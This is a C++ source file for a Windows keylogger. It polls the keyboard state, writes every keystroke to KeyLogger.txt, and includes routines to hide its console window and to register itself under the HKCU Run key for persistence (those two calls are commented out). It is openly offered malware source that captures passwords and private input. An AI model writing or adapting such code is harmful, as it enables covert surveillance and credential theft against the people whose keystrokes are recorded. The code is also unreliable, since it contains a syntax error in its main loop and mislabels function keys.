#ifndef NOMINMAX
#define NOMINMAX
#endif
#define _WIN32_WINNT 0x0500
#include <windows.h>

#include <iostream>
#include <iomanip>
#include <string>
#include <fstream>
#include <ctime>
#include <sstream>

void report_error(const TCHAR * file, int line, const TCHAR * function, DWORD error_code = GetLastError())
{
    std::fstream log("log.txt",std::ios::app);
    log << file << ":" << line << " ";
    std::time_t t = std::time(nullptr);
    std::tm* now = std::localtime(&t);
    log << now->tm_hour << ":" << now->tm_min << " "<< function << ": error " << "0x" << std::hex << error_code << " happened";
    TCHAR * message = reinterpret_cast<TCHAR *>(&message);
    DWORD result = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_ALLOCATE_BUFFER, NULL, error_code, 0, message, 128, NULL);
    if( result ) {
        log << ": " << message << std::endl;
        if(LocalFree(message)!=NULL){
            log << "LocalFree failed, PANIC!!!!1111";
            exit(1);
        }
    }
    else {
        log << " and FormatMessage failed" << std::endl;
    }
}

#define REPORT_ERROR(function)            { report_error(__FILE__, __LINE__, function); }
#define REPORT_ERROR_CODE(function, code) { report_error(__FILE__, __LINE__, function, code); }

#define CASE_KEY(key_name)     \
case VK_##key_name:            \
    out = "{" #key_name "}" ;  \
    break;

void log_key(int key)
{
    std::string out;
    switch(key){
        CASE_KEY(BACK)
        CASE_KEY(TAB)
        CASE_KEY(CLEAR)
        case VK_RETURN:
            out = "{ENTER}\n";
            break;
        CASE_KEY(SHIFT)
        CASE_KEY(CONTROL)
        case VK_MENU:
            out = "{ALT}";
            break;
        CASE_KEY(PAUSE)
        CASE_KEY(CAPITAL)
        case VK_ESCAPE:
            exit(0);
            break;
        CASE_KEY(SPACE)
        case VK_PRIOR:
            out = "{PAGE UP}";
            break;
        case VK_NEXT:
            out = "{PAGE DOWN}";
            break;
        CASE_KEY(END)
        CASE_KEY(HOME)
        CASE_KEY(LEFT)
        CASE_KEY(UP)
        CASE_KEY(RIGHT)
        CASE_KEY(DOWN)
        case VK_SNAPSHOT: //fallthru
        CASE_KEY(PRINT)
        CASE_KEY(INSERT)
        CASE_KEY(DELETE)
        case VK_LWIN: //fallthru
        case VK_RWIN:
            out = "{WINDOWS}";
            break;
        CASE_KEY(SLEEP)
        case VK_MULTIPLY:
            out = "*";
            break;
        case VK_ADD:
            out = "+";
            break;
        case VK_SUBTRACT:
            out = "-";
            break;
        case VK_DECIMAL:
            out = ".";
            break;
        case VK_DIVIDE:
            out = "/";
            break;
        CASE_KEY(NUMLOCK)
        CASE_KEY(SCROLL)
        case VK_LSHIFT:
            out = "{LEFT SHIFT}";
            break;
        case VK_RSHIFT:
            out = "{RIGHT SHIFT}";
            break;
        case VK_LCONTROL:
            out = "{LEFT CONTROL}";
            break;
        case VK_RCONTROL:
            out = "{RIGHT CONTROL}";
            break;
        case VK_LMENU:
            out = "{LEFT ALT}";
            break;
        case VK_RMENU:
            out = "{RIGHT ALT}";
            break;
        case VK_F12:
            exit(0);
        default:
            if( (0x30<=key && key<=0x39) || (0x41<=key && key<=0x5A) ) {
                out = key;
            } else if (0x60<=key && key<=0x69) {
                std::stringstream ss;
                ss << "{NUM" << key-0x60 << "}";
                out = ss.str();
            } else if (0x70<=key && key<=0x87) {
                std::stringstream ss;
                ss << "{F" << key - 0x60 + 1 << "}";
                out = ss.str();
            }
            break;
    }
    if(out.size()) {
        std::fstream f("KeyLogger.txt", std::ios::app);
        f<<out;
    }
}

void hide_console_window()
{
    HWND console_window_handle = ::GetConsoleWindow();
    if(!console_window_handle){
        REPORT_ERROR("GetConsoleWindow");
    }
    if(!::ShowWindow(console_window_handle, SW_HIDE)){
        REPORT_ERROR("ShowWindow");
    }
}

bool set_forgound_window_layout()
{
    HWND foreground_window = ::GetForegroundWindow();
    if(!foreground_window) {
        REPORT_ERROR("GetForegroundWindow");
        return false;
    }
    DWORD thread_id = ::GetWindowThreadProcessId(foreground_window, NULL);
    if(!thread_id) {
        REPORT_ERROR("GetWindowThreadProcessId");
        return false;
    }
    HKL target_layout = ::GetKeyboardLayout(thread_id);
    if(!target_layout){
        REPORT_ERROR("GetKeyboardLayout");
        return false;
    }
    HKL old_layout = ::ActivateKeyboardLayout(target_layout, 0);
    if(!old_layout) {
        REPORT_ERROR("ActivateKeyboardLayout");
        return false;
    }
    return true;
}

bool log_key_name_winapi(int key)
{
    const size_t key_name_size = 1024;
    TCHAR key_name[key_name_size];
    int result = GetKeyNameText(key<<16, key_name, key_name_size);
    if(!result){
        REPORT_ERROR("GetKeyNameText");
        return false;
    }
    std::fstream f("KeyLogger.txt", std::ios::app);
    f<<key_name <<" ";
    return true;
}

std::string get_executable_path()
{
    TCHAR executable_path[MAX_PATH];
    DWORD path_length = ::GetModuleFileName( NULL, executable_path, MAX_PATH );
    if( path_length == 0 ||  MAX_PATH <= path_length ) {
        REPORT_ERROR("GetModuleFileName");
        return std::string();
    }
    return std::string(executable_path);
}

void set_current_directory(const std::string & executable_path)
{
    std::string directory(executable_path, 0, executable_path.rfind('\\'));
    if(!::SetCurrentDirectory(directory.c_str())){
        REPORT_ERROR("SetCurrentDirectory");
    }
}

void set_startup(const std::string & executable)
{
    HKEY hKey;
    DWORD result = ::RegOpenKeyEx(HKEY_CURRENT_USER,
                                  "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                  0,
                                  KEY_SET_VALUE,
                                  &hKey);
    if( (result != ERROR_SUCCESS) || (hKey == NULL) ) {
        REPORT_ERROR_CODE("RegOpenKeyEx", result);
    } else {
        LONG result = ::RegSetValueEx(hKey, "My program", 0, REG_SZ, reinterpret_cast<LPBYTE>(const_cast<char *>(executable.c_str())), executable.size());
        if( result != ERROR_SUCCESS ){
            REPORT_ERROR("RegSetValueEx");
        }
        result = ::RegCloseKey(hKey);
        if( result != ERROR_SUCCESS ){
            REPORT_ERROR("RegCloseKey");
        }
    }
}

int main()
{
    std::string executable_path = get_executable_path();
    if( !executable_path.empty() ) {
        set_current_directory(executable_path);
        //set_startup(executable_path);
    }
    //hide_console_window();
    bool key_status[256] = {false};
    while(true)
    {
        bool is_layout_set = set_forgound_window_layout();
        for(unsigned char key=VK_BACK;key<=VK_OEM_CLEAR;++key)
        {
            if(::GetAsyncKeyState(key)== 0x0000) )
            {
                if(key_status[key]){
                    if( !is_layout_set || !log_key_name_winapi(key) ) {
                        log_key(key);
                    }
                    key_status[key] = false;
                }

            } else {
                key_status[key] = true;
            }
        }
        Sleep(10);
    }
    return 0;
}
